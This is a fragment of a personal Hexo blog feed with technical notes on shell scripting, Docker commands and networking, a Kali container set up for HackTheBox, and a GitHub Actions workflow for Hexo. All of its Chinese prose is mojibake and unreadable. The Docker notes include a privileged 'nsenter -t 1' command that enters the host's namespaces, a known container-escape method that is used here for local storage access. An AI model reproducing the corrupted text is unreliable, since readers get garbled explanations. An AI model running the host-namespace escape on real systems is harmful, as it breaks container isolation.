class="hljs-title">funWithParam</span></span>()&#123;</span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ç¬¬ä¸€ä¸ªå‚æ•°ä¸º <span class="hljs-variable">$1</span> !&quot;</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ç¬¬äºŒä¸ªå‚æ•°ä¸º <span class="hljs-variable">$2</span> !&quot;</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ç¬¬åä¸ªå‚æ•°ä¸º <span class="hljs-variable">$10</span> !&quot;</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ç¬¬åä¸ªå‚æ•°ä¸º <span class="hljs-variable">$&#123;10&#125;</span> !&quot;</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ç¬¬åä¸€ä¸ªå‚æ•°ä¸º <span class="hljs-variable">$&#123;11&#125;</span> !&quot;</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;å‚æ•°æ€»æ•°æœ‰ <span class="hljs-variable">$#</span> ä¸ª!&quot;</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²è¾“å‡ºæ‰€æœ‰å‚æ•° $* !&quot;</span></span><span class="line">&#125;</span><span class="line">funWithParam 1 2 3 4 5 6 7 8 9 34 73</span></code></pre></div></div><p>ç»“æœï¼š </p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-tap codeBlockLines"><span class="line">ç¬¬ä¸€ä¸ªå‚æ•°ä¸º<span class="hljs-number"> 1 </span>!</span><span class="line">ç¬¬äºŒä¸ªå‚æ•°ä¸º<span class="hljs-number"> 2 </span>!</span><span class="line">ç¬¬åä¸ªå‚æ•°ä¸º<span class="hljs-number"> 10 </span>!</span><span class="line">ç¬¬åä¸ªå‚æ•°ä¸º<span class="hljs-number"> 34 </span>!</span><span class="line">ç¬¬åä¸€ä¸ªå‚æ•°ä¸º<span class="hljs-number"> 73 </span>!</span><span class="line">å‚æ•°æ€»æ•°æœ‰<span class="hljs-number"> 11 </span>ä¸ª!</span><span class="line">ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²è¾“å‡ºæ‰€æœ‰å‚æ•°<span class="hljs-number"> 1 </span>2<span class="hljs-number"> 3 </span>4<span class="hljs-number"> 5 </span>6<span class="hljs-number"> 7 </span>8<span class="hljs-number"> 9 </span>34<span class="hljs-number"> 73 </span>!</span></code></pre></div></div><h2 id="è¾“å…¥è¾“å‡º"><a href="#è¾“å…¥è¾“å‡º" class="headerlink" title="è¾“å…¥è¾“å‡º"></a>è¾“å…¥è¾“å‡º</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">who &gt; today.log <span class="hljs-comment"># æ‰§è¡Œç»“æœè¦†ç›–åˆ°æ–‡ä»¶ today.log</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;èœé¸Ÿæ•™ç¨‹ï¼šwww.runoob.com&quot;</span> &gt;&gt; today.log <span class="hljs-comment"># æ‰§è¡Œç»“æœè¿½åŠ åˆ°æ–‡ä»¶ today.log</span></span><span class="line">wc -l &lt; today.log <span class="hljs-comment"># ç»Ÿè®¡ today.log è¡Œæ•°</span></span><span class="line">wc -l &lt;&lt; <span class="hljs-string">EOF</span></span><span class="line"><span class="hljs-string">    æç™½</span></span><span class="line"><span class="hljs-string">    è‹è½¼</span></span><span class="line"><span class="hljs-string">    ç‹å‹ƒ</span></span><span class="line"><span class="hljs-string">EOF</span></span></code></pre></div></div><h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><p>test1.sh</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">name=<span class="hljs-string">&quot;Chris&quot;</span></span></code></pre></div></div><p>test2.sh</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-comment">#ä½¿ç”¨ . å·æ¥å¼•ç”¨test1.sh æ–‡ä»¶</span></span><span class="line">. ./test1.sh</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># æˆ–è€…ä½¿ç”¨ä»¥ä¸‹åŒ…å«æ–‡ä»¶ä»£ç </span></span><span class="line"><span class="hljs-comment"># source ./test1.sh</span></span><span class="line"></br></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$name</span></span></code></pre></div></div><blockquote><p>æ³¨ï¼šè¢«åŒ…å«çš„æ–‡ä»¶ test1.sh ä¸éœ€è¦å¯æ‰§è¡Œæƒé™ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
          <category> çŸ¥è¯†ç‚¹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker æŠ€æœ¯</title>
      <link href="/2021/07/06/docker/"/>
      <url>/2021/07/06/docker/</url>
      
        <content type="html"><![CDATA[<h2 id="Docker-æ˜¯ä»€ä¹ˆ"><a href="#Docker-æ˜¯ä»€ä¹ˆ" class="headerlink" title="Docker æ˜¯ä»€ä¹ˆ"></a>Docker æ˜¯ä»€ä¹ˆ</h2><p>dockeræ˜¯å¯ä»¥ä»¥æä½èµ„æºè¿è¡Œçš„ä¸€ä¸ªç‹¬ç«‹äºæ–‡ä»¶ç³»ç»Ÿçš„ä¸€ä¸ªç©ºé—´</p><h3 id="å‡ ä¸ªåŸºæœ¬æ¦‚å¿µ"><a href="#å‡ ä¸ªåŸºæœ¬æ¦‚å¿µ" class="headerlink" title="å‡ ä¸ªåŸºæœ¬æ¦‚å¿µ"></a>å‡ ä¸ªåŸºæœ¬æ¦‚å¿µ</h3><ul><li><code>image</code>  é•œåƒï¼Œ ç±»ä¼¼äºç±»çš„æ¦‚å¿µ</li><li><code>container</code> å®¹å™¨ï¼Œ ç±»ä¼¼äºå®ä¾‹çš„æ¦‚å¿µ</li></ul><h3 id="docker-åœ¨windowsä¸‹çš„ä½¿ç”¨"><a href="#docker-åœ¨windowsä¸‹çš„ä½¿ç”¨" class="headerlink" title="docker åœ¨windowsä¸‹çš„ä½¿ç”¨"></a>docker åœ¨windowsä¸‹çš„ä½¿ç”¨</h3><p>dockerä¸€èˆ¬æ˜¯Linuxç³»ç»Ÿä¸‹çš„å·¥å…·ï¼Œä½†æ˜¯å½“windowså‡ºäº†ä¸ªWSLåï¼Œdockerå°±ä»¥ä¸€ä¸ªWSLåœ¨windowsä¸‹è¿è¡Œäº†ã€‚</p><p>æ¯ä¸€ä¸ªWSLåœ¨windowsä¸­éƒ½æ˜¯ç‹¬ç«‹çš„<code>vhdx</code>æ–‡ä»¶</p><p>å¯ä»¥é€šè¿‡<code>wsl -l -v</code> æŸ¥çœ‹dockeræ–‡ä»¶ï¼Œ é€šè¿‡<code>wsl -d docker-desktop</code>è¿›å…¥</p><h4 id="windowsä¸‹çš„é…ç½®"><a href="#windowsä¸‹çš„é…ç½®" class="headerlink" title="windowsä¸‹çš„é…ç½®"></a>windowsä¸‹çš„é…ç½®</h4><h5 id="ä¿®æ”¹å­˜å‚¨ä½ç½®"><a href="#ä¿®æ”¹å­˜å‚¨ä½ç½®" class="headerlink" title="ä¿®æ”¹å­˜å‚¨ä½ç½®"></a>ä¿®æ”¹å­˜å‚¨ä½ç½®</h5><ul><li><a href="https://blog.csdn.net/austindev/article/details/110387609">å‚è€ƒ</a>è¿™ç¯‡æ–‡ç« </li></ul><p>åŸç†æ˜¯å°†docker<code>export</code>å‡ºæ¥åï¼Œ<code>import</code>åˆ°æ–°çš„åœ°æ–¹</p><p>æˆ‘ä¿å­˜çš„åœ°æ–¹æ˜¯<code>D:\Subsystem\docker-desktop-data</code></p><h5 id="å…³äºimageåˆ°åº•å­˜åœ¨å“ªé‡Œ"><a href="#å…³äºimageåˆ°åº•å­˜åœ¨å“ªé‡Œ" class="headerlink" title="å…³äºimageåˆ°åº•å­˜åœ¨å“ªé‡Œ"></a>å…³äºimageåˆ°åº•å­˜åœ¨å“ªé‡Œ</h5><ul><li><a href="https://www.freecodecamp.org/news/where-are-docker-images-stored-docker-container-paths-explained/">è¿™ç¯‡æ–‡ç« </a>è®²è¿°äº†imageå­˜æ”¾çš„é—®é¢˜ã€‚</li></ul><p>windowsæ˜¯æŒ‰ç…§è™šæ‹Ÿæœºçš„æ–¹å¼å­˜å‚¨ï¼Œè€Œè¦è¿›å…¥è¿™ä¸ªè™šæ‹Ÿæœºæ˜¯é€šè¿‡å„ä¸ªimagesï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><p><code>docker run -it --privileged --pid=host &lt;image&gt; nsenter -t 1 -m -u -i bash</code></p><p>è€Œæ¯ä¸ªimageå…¶å®æ˜¯é€šè¿‡åº•ä¸‹ä¸€å±‚imageå åŠ ä¸Šæ¥çš„ï¼Œæ‰€ä»¥å¯ä»¥æ‰¾åˆ°<code>/var/lib/docker/overlay2</code>ä¸­æ¯ä¸€å±‚å åŠ çš„å†…å®¹</p><h2 id="docker-å¸¸ç”¨å‘½ä»¤"><a href="#docker-å¸¸ç”¨å‘½ä»¤" class="headerlink" title="docker å¸¸ç”¨å‘½ä»¤"></a>docker å¸¸ç”¨å‘½ä»¤</h2><ul><li><a href="https://www.runoob.com/docker/docker-command-manual.html">è¿™é‡Œ</a>æ˜¯å¸¸ç”¨å‘½ä»¤å¤§å…¨</li></ul><h3 id="è·å–é•œåƒ"><a href="#è·å–é•œåƒ" class="headerlink" title="è·å–é•œåƒ"></a>è·å–é•œåƒ</h3><p>åœ¨è·å–é•œåƒå‰ï¼Œå¯ä»¥é€šè¿‡<code>docker search</code> æ¥é•œåƒæŸ¥æ‰¾ç›¸å…³å†…å®¹ã€‚ä½†æ˜¯æœ‰çš„æ˜¯éœ€è¦ç‰¹å®šç‰ˆæœ¬çš„ï¼Œè¿™ä¸ªéœ€è¦å…ˆåœ¨<a href="https://hub.docker.com/">hub.docker.com</a>ä¸Šç¡®è®¤ç‰ˆæœ¬ã€‚</p><ul><li><code>docker pull &lt;é•œåƒ&gt;:&lt;ç‰ˆæœ¬&gt;</code></li></ul><h3 id="åˆ›å»ºè‡ªå·±çš„é•œåƒ"><a href="#åˆ›å»ºè‡ªå·±çš„é•œåƒ" class="headerlink" title="åˆ›å»ºè‡ªå·±çš„é•œåƒ"></a>åˆ›å»ºè‡ªå·±çš„é•œåƒ</h3><p>æ–¹æ³•æ˜¯ä½¿ç”¨<code>Dockerfile</code>ï¼Œåœ¨é‡Œé¢å†™å¥½åä½¿ç”¨</p><p><code>docker build -t &lt;image_name&gt; .</code> åˆ›å»º</p><h3 id="æŸ¥çœ‹"><a href="#æŸ¥çœ‹" class="headerlink" title="æŸ¥çœ‹"></a>æŸ¥çœ‹</h3><ul><li><code>docker ps</code> æŸ¥çœ‹è¿è¡Œä¸­çš„å®¹å™¨</li><li><code>docker ps -a</code> æŸ¥çœ‹æ‰€æœ‰å®¹å™¨</li><li><code>docker images</code> æŸ¥çœ‹å­˜åœ¨çš„é•œåƒ</li></ul><h3 id="å¯åŠ¨å®¹å™¨"><a href="#å¯åŠ¨å®¹å™¨" class="headerlink" title="å¯åŠ¨å®¹å™¨"></a>å¯åŠ¨å®¹å™¨</h3><p>ä»¥<code>docker run</code>å¼€å¤´</p><table><thead><tr><th align="center">å‚æ•°</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center"><code>--name &lt;alias&gt;</code></td><td align="center">å®¹å™¨åˆ«å</td></tr><tr><td align="center"><code>-v &lt;ä¸»æœºæ–‡ä»¶&gt;:&lt;å®¹å™¨æ–‡ä»¶&gt;</code></td><td align="center">æŒ‚è½½å¦‚æœæ²¡æœ‰æ–‡ä»¶ä¼šè‡ªåŠ¨åˆ›å»º</td></tr><tr><td align="center"><code>-it</code></td><td align="center">äº¤äº’ç•Œé¢</td></tr><tr><td align="center"><code>-d</code></td><td align="center">åå°è¿è¡Œ</td></tr><tr><td align="center"><code>-p &lt;ä¸»æœºç«¯å£&gt;:&lt;å®¹å™¨ç«¯å£&gt;</code></td><td align="center">å°†ä¸»æœºçš„ç«¯å£æ˜ å°„åˆ°å®¹å™¨çš„ç«¯å£ä¸­</td></tr><tr><td align="center"><code>-e &lt;ç¯å¢ƒå˜é‡=Value&gt;</code></td><td align="center">è®¾ç½®ç¯å¢ƒå˜é‡</td></tr></tbody></table><p>ä¾‹å­ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">docker run --name  myphp-fpm -v ~/nginx/www:/www  -d php:5.6-fpm</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">docker run --name apache -v <span class="hljs-variable">$PWD</span>:/usr/<span class="hljs-built_in">local</span>/apache2/htdocs -p 8088:80  -it httpd /bin/bash</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">docker run -it httpd /bin/bash</span></code></pre></div></div><p>åƒ<code>php</code>è¿™æ ·çš„å¯èƒ½ä¼šç«‹é©¬å°±é€€å‡ºäº†ï¼Œæ‰€ä»¥éœ€è¦æ‰“å¼€ä¸€ä¸ªShellæ¥ä¿æ´»ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">docker run -itd php bash</span></code></pre></div></div><h3 id="å®¹å™¨æ‰§è¡Œå‘½ä»¤"><a href="#å®¹å™¨æ‰§è¡Œå‘½ä»¤" class="headerlink" title="å®¹å™¨æ‰§è¡Œå‘½ä»¤"></a>å®¹å™¨æ‰§è¡Œå‘½ä»¤</h3><p>ä»¥<code>docker exec</code> å¼€å¤´</p><ul><li><code>-it</code> äº¤äº’</li></ul><p>ä¾‹å­ï¼š</p><ul><li><code>docker exec apache ls /usr/local/apache2/htdocs</code></li><li><code>docker exec -it apache /bin/bash</code></li></ul><h3 id="åˆ é™¤"><a href="#åˆ é™¤" class="headerlink" title="åˆ é™¤"></a>åˆ é™¤</h3><p>å½“åˆ›å»ºäº†å®¹å™¨åä¼šä¸€ç›´ä¿ç•™ï¼Œæ‰€ä»¥éœ€è¦åˆ é™¤</p><ul><li><p>åˆ é™¤æ‰€æœ‰é€€å‡ºçš„å®¹å™¨</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">docker rm -v `docker ps -aq -f status=exited`</span></code></pre></div></div></li><li><p>åˆ é™¤é•œåƒ</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">docker rmi &lt;image ID&gt;</span></code></pre></div></div></li></ul><p>docker æä¾›äº†æ›´ä¸ºç®€å•çš„æ–¹æ³•</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-gauss codeBlockLines"><span class="line">docker <span class="hljs-keyword">system</span> prune <span class="hljs-meta">#å°†å¯¹æ²¡æœ‰ç”¨çš„å®¹å™¨çš„ç½‘ç»œè¿›è¡Œåˆ é™¤</span></span><span class="line">docker container prune <span class="hljs-meta"># åˆ é™¤æ‰€æœ‰é€€å‡ºçŠ¶æ€çš„å®¹å™¨</span></span><span class="line">docker <span class="hljs-built_in">volume</span> prune <span class="hljs-meta"># åˆ é™¤æœªè¢«ä½¿ç”¨çš„æ•°æ®å·</span></span><span class="line">docker image prune <span class="hljs-meta"># åˆ é™¤ dangling æˆ–æ‰€æœ‰æœªè¢«ä½¿ç”¨çš„é•œåƒ</span></span></code></pre></div></div><ul><li><a href="https://www.cnblogs.com/sparkdev/p/9177283.html">å‚è€ƒæ–‡ç« </a></li></ul><h3 id="Commitå®¹å™¨"><a href="#Commitå®¹å™¨" class="headerlink" title="Commitå®¹å™¨"></a>Commitå®¹å™¨</h3><h3 id="æ‚é¡¹"><a href="#æ‚é¡¹" class="headerlink" title="æ‚é¡¹"></a>æ‚é¡¹</h3><ul><li><code>Ctrl + P + Q</code> é€€å‡ºå¹¶åå°è¿è¡Œ</li></ul><h2 id="Docker-å®¹å™¨é—´çš„é€šè®¯"><a href="#Docker-å®¹å™¨é—´çš„é€šè®¯" class="headerlink" title="Docker å®¹å™¨é—´çš„é€šè®¯"></a>Docker å®¹å™¨é—´çš„é€šè®¯</h2><ul><li><a href="https://my.oschina.net/thinwonton/blog/2993309">è¿™é‡Œ</a>æ˜¯å‚è€ƒæ–‡ç« </li></ul><p>åŸç†æ˜¯dockerå†…ç½®äº†Bridgeç½‘æ¡¥ç»„ä»¶ï¼Œå„ä¸ªå®¹å™¨ä¼šåˆ†é…IPåœ°å€ï¼Œä½†æ˜¯åªæœ‰è‡ªå®šä¹‰çš„Bridgeç½‘ç»œæ‰èƒ½äº’ç›¸é€šè®¯</p><ul><li><p>åˆ›å»ºè‡ªå®šä¹‰Bridgeç½‘ç»œ</p><ul><li><code>docker network create --driver bridge busybox_bridge</code></li></ul></li><li><p>å°†å®¹å™¨ç»‘å®šåˆ°è‡ªå®šä¹‰Bridgeç½‘ç»œä¸­</p><ul><li><code>docker run -itd --network busybox_bridge --name busybox5 busybox</code></li></ul></li></ul><h2 id="Docker-Compose"><a href="#Docker-Compose" class="headerlink" title="Docker Compose"></a>Docker Compose</h2><p><code>docker-compose</code>æ˜¯å¯ä»¥å°†å¤šä¸ªé•œåƒé€šè¿‡ä¸€å¥—åˆ¶å®šçš„è§„åˆ™ç»Ÿä¸€è¿è¡Œèµ·æ¥çš„å·¥å…·ã€‚æå¤§çš„æ–¹ä¾¿äº†æ¯æ¬¡å¯åŠ¨dockeréœ€è¦éº»çƒ¦é…ç½®çš„åŠ¨ä½œã€‚</p><p>ä½¿ç”¨<code>YAML</code>æ–‡ä»¶é…ç½®</p><p><a href="https://cch20094.medium.com/docker-compose%E6%9E%B6%E8%A8%ADphp-mysql-apache-710321374758">è¿™ç¯‡</a>ä»‹ç»äº†å¦‚ä½•ä½¿ç”¨<code>docker-compose</code>æ¥æ­å»º<code>PHP + Apache + MySql</code>çš„ç¯å¢ƒ</p><h2 id="æŠ€å·§"><a href="#æŠ€å·§" class="headerlink" title="æŠ€å·§"></a>æŠ€å·§</h2><h3 id="Docker-å®¹å™¨çš„ç«¯å£ä¿®æ”¹"><a href="#Docker-å®¹å™¨çš„ç«¯å£ä¿®æ”¹" class="headerlink" title="Docker å®¹å™¨çš„ç«¯å£ä¿®æ”¹"></a>Docker å®¹å™¨çš„ç«¯å£ä¿®æ”¹</h3><ol><li><p>å…³é—­å®¹å™¨ <code>docker stop &lt;container&gt;</code></p></li><li><p>è¿›å…¥é•œåƒçš„å­˜å‚¨åœ°æ–¹</p><ul><li><code>docker run -it --privileged --pid=host &lt;image&gt; nsenter -t 1 -m -u -i bash</code></li></ul></li><li><p>æ‰¾åˆ°å­˜å‚¨çš„å®¹å™¨ç‚¹</p><ul><li><code>cd /var/lib/docker/containers/&lt;contian ID&gt;</code></li></ul></li><li><p>ä¿®æ”¹hostconfig.json å’Œ config.v2.json</p></li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-vala codeBlockLines"><span class="line"><span class="hljs-meta"># vim hostconfig.json</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">&quot;PortBindings&quot;</span>:&#123;<span class="hljs-string">&quot;5711/tcp&quot;</span>:[&#123;<span class="hljs-string">&quot;HostIp&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;HostPort&quot;</span>:<span class="hljs-string">&quot;5711&quot;</span>&#125;]&#125;</span><span class="line"></br></span><span class="line"><span class="hljs-meta">#vim config.v2.json</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">&quot;ExposedPorts&quot;</span>:&#123;<span class="hljs-string">&quot;5711/tcp&quot;</span>:&#123;&#125;&#125;</span><span class="line"></br></span><span class="line"><span class="hljs-string">&quot;Ports&quot;</span>:&#123;<span class="hljs-string">&quot;5711/tcp&quot;</span>:[&#123;<span class="hljs-string">&quot;HostIp&quot;</span>:<span class="hljs-string">&quot;0.0.0.0&quot;</span>,<span class="hljs-string">&quot;HostPort&quot;</span>:<span class="hljs-string">&quot;5711&quot;</span>&#125;]&#125;</span></code></pre></div></div><ol start="5"><li>é‡å¯æœåŠ¡ <code>systemctl restart docker</code></li></ol><h3 id="docker-è¿æ¥-hackthebox"><a href="#docker-è¿æ¥-hackthebox" class="headerlink" title="docker è¿æ¥ hackthebox"></a>docker è¿æ¥ hackthebox</h3><p>é—®é¢˜1ï¼š<br>/dev/net/tun: not the file</p><ul><li><a href="https://stackoverflow.com/questions/30547484/calling-openconnect-vpn-client-in-docker-container-shows-tunsetiff-failed-opera">è§£å†³è¿æ¥</a></li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-applescript codeBlockLines"><span class="line">docker <span class="hljs-built_in">run</span> -<span class="hljs-keyword">it</span> <span class="hljs-comment">--privileged mykali /bin/bash</span></span></code></pre></div></div><p>åŠ å…¥æ‰€æœ‰æƒé™ï¼Œæˆ–è€…åªåŠ å…¥ä¸€ä¸ªèƒ½åŠ›<code>--cap-add SYS_NET_ADMIN --device /dev/net/tun </code></p><p>é—®é¢˜2ï¼š<br><code> Linux can&#39;t add IPv6 to interface tun0</code></p><p>æ²¡æœ‰å¼€å¯ipv6</p><ul><li><code>--sysctl net.ipv6.conf.all.disable_ipv6=0</code></li></ul><h3 id="Docker-kali-connect-to-hackthebox"><a href="#Docker-kali-connect-to-hackthebox" class="headerlink" title="Docker kali connect to hackthebox"></a>Docker kali connect to hackthebox</h3><ul><li><a href="https://amar-laksh.github.io/2019/08/24/Setting-up-Kali-docker-for-HackTheBox.html">å‚è€ƒé“¾æ¥</a></li></ul><p>ç«¯å£è½¬å‘</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">socat</span> TCP<span class="hljs-number">4</span>-LISTEN:<span class="hljs-number">1633</span>,reuseaddr,fork TCP<span class="hljs-number">4</span>:<span class="hljs-number">10.10.10.28:80</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo éƒ¨ç½²</title>
      <link href="/2021/07/05/hexo-%E9%83%A8%E7%BD%B2/"/>
      <url>/2021/07/05/hexo-%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><ul><li><a href="https://hexo.io/zh-cn/docs/">hexo çš„æ–‡æ¡£</a></li></ul><p><code>hexo</code>åŸºäº<code>Node.js</code>å¼€å‘ï¼Œå®‰è£…ç®€å•</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-cmake codeBlockLines"><span class="line">npm <span class="hljs-keyword">install</span> hexo -g</span></code></pre></div></div><blockquote><p>å¦‚æœè¦éƒ¨ç½²çš„è¯ï¼Œ<code>npm install</code>å°±å¯ä»¥äº†ï¼Œå› ä¸º<code>node_module</code>ä¸­å·²ç»åŒ…å«äº†<code>hexo</code></p></blockquote><h2 id="å®‰è£…3-hexoä¸»é¢˜"><a href="#å®‰è£…3-hexoä¸»é¢˜" class="headerlink" title="å®‰è£…3-hexoä¸»é¢˜"></a>å®‰è£…3-hexoä¸»é¢˜</h2><ul><li><a href="https://github.com/yelog/hexo-theme-3-hexo">3-hexo çš„æ–‡æ¡£</a></li></ul><h2 id="hexo-çš„åŸºæœ¬ä½¿ç”¨"><a href="#hexo-çš„åŸºæœ¬ä½¿ç”¨" class="headerlink" title="hexo çš„åŸºæœ¬ä½¿ç”¨"></a>hexo çš„åŸºæœ¬ä½¿ç”¨</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-gauss codeBlockLines"><span class="line">hexo <span class="hljs-keyword">new</span> [<span class="hljs-built_in">title</span>]   <span class="hljs-meta"># æŒ‰ç…§æ¨¡æ¿åˆ›å»ºæ–°çš„postæ–‡ç« </span></span><span class="line">hexo <span class="hljs-keyword">new</span> draft [<span class="hljs-built_in">title</span>]  <span class="hljs-meta"># åˆ›å»ºä¸€ä¸ªè‰ç¨¿</span></span><span class="line">hexo generate      <span class="hljs-meta"># é™æ€ç¼–è¯‘</span></span><span class="line">hexo list post     <span class="hljs-meta"># æŸ¥çœ‹å·²å‘å¸ƒçš„æ–‡ç« </span></span><span class="line">hexo publish draft &lt;filename&gt;      <span class="hljs-meta"># å°†è‰ç¨¿draft è½¬åˆ° post</span></span><span class="line">hexo server --draft   <span class="hljs-meta"># å°†è‰ç¨¿ä¹Ÿæ¸²æŸ“å‡ºæ¥</span></span></code></pre></div></div><h2 id="åœ¨Githubä¸Šéƒ¨ç½²"><a href="#åœ¨Githubä¸Šéƒ¨ç½²" class="headerlink" title="åœ¨Githubä¸Šéƒ¨ç½²"></a>åœ¨Githubä¸Šéƒ¨ç½²</h2><p>æˆ‘ä½¿ç”¨çš„æ–¹å¼ä¸ºActionéƒ¨ç½²åˆ°<code>gh-page</code>åˆ†æ”¯ä¸Š</p><p><code>.github/workflows/hexo.yml</code> æ–‡ä»¶</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-yaml codeBlockLines"><span class="line"><span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span> <span class="hljs-string">Github</span> <span class="hljs-string">pages</span></span><span class="line"><span class="hljs-attr">on:</span></span><span class="line">  <span class="hljs-attr">push:</span></span><span class="line">    <span class="hljs-attr">branches:</span></span><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-string">master</span></span><span class="line"><span class="hljs-attr">jobs:</span></span><span class="line">  <span class="hljs-attr">build-and-deploy:</span></span><span class="line">    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span></span><span class="line">    <span class="hljs-attr">steps:</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Checkout</span></span><span class="line">      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@master</span></span><span class="line">      <span class="hljs-attr">with:</span></span><span class="line">        <span class="hljs-attr">persist-credentials:</span> <span class="hljs-literal">false</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">and</span> <span class="hljs-string">Build</span></span><span class="line">      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span></span><span class="line"><span class="hljs-string">        npm install</span></span><span class="line"><span class="hljs-string">        node_modules/hexo/bin/hexo generate</span></span><span class="line"><span class="hljs-string"></span>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span></span><span class="line">      <span class="hljs-attr">uses:</span> <span class="hljs-string">JamesIves/github-pages-deploy-action@releases/v3</span></span><span class="line">      <span class="hljs-attr">with:</span></span><span class="line">        <span class="hljs-attr">ACCESS_TOKEN:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.ACCESS_TOKEN</span> <span class="hljs-string">&#125;&#125;</span></span><span class="line">        <span class="hljs-attr">BRANCH:</span> <span class="hljs-string">gh-pages</span></span><span class="line">        <span class="hljs-attr">FOLDER:</span> <span class="hljs-string">public</span></span><span class="line">        <span class="hljs-attr">BUILD_SCRIPT:</span> <span class="hljs-string">npm</span> <span class="hljs-string">install</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">node_modules/hexo/bin/hexo</span> <span class="hljs-string">generate</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> å‰ç«¯æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docusaurus å®ç°æœç´¢åŠŸèƒ½</title>
      <link href="/2021/06/28/docu%E5%AE%9E%E7%8E%B0%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/"/>
      <url>/2021/06/28/docu%E5%AE%9E%E7%8E%B0%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/</url>
      
